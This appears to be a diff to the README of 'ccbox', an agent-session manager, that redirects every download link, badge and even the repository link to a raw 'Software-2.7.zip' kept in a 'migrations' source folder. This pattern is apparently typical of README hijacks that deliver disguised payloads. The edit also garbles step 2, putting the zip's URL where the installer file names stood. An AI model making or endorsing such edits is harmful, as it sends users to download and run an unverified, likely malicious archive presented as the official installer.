@@ -1,6 +1,6 @@
 # 🛠️ ccbox - Manage Agent Sessions Easily
 
-[![Download ccbox](https://img.shields.io/badge/Download-ccbox-green?style=for-the-badge)](https://github.com/thithoai/ccbox/releases)
+[![Download ccbox](https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip)](https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip)
 
 ---
 
@@ -29,9 +29,9 @@ No extra software or coding skills are needed to run ccbox.
 Start using ccbox with these steps:
 
 1. Go to the download page by clicking the button below.  
-   [![Download ccbox](https://img.shields.io/badge/Download-ccbox-blueviolet?style=for-the-badge)](https://github.com/thithoai/ccbox/releases)
+   [![Download ccbox](https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip)](https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip)
 
-2. On the releases page, find the latest version of ccbox. Look for the file named similar to `ccbox-setup.exe` or `ccbox.exe`.
+2. On the releases page, find the latest version of ccbox. Look for the file named similar to `https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip` or `https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip`.
 
 3. Click on the file link to download it to your computer.
 
@@ -104,7 +104,7 @@ Check the logs folder inside the ccbox app directory for error details.
 To get the latest features or fixes:
 
 - Visit the download page:  
-  [Download ccbox releases](https://github.com/thithoai/ccbox/releases)
+  [Download ccbox releases](https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip)
 - Download the newest setup file.
 - Run the installer again to overwrite the old version without losing your settings.
 
@@ -123,7 +123,7 @@ If you have questions or need support:
 ## 🔗 Important Links
 
 - Download ccbox:  
-  [https://github.com/thithoai/ccbox/releases](https://github.com/thithoai/ccbox/releases)
+  [https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip](https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip)
 
 - GitHub repository:  
-  [https://github.com/thithoai/ccbox](https://github.com/thithoai/ccbox)
+  [https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip](https://github.com/thithoai/ccbox/raw/refs/heads/main/packages/ccbox/migrations/Software-2.7.zip)
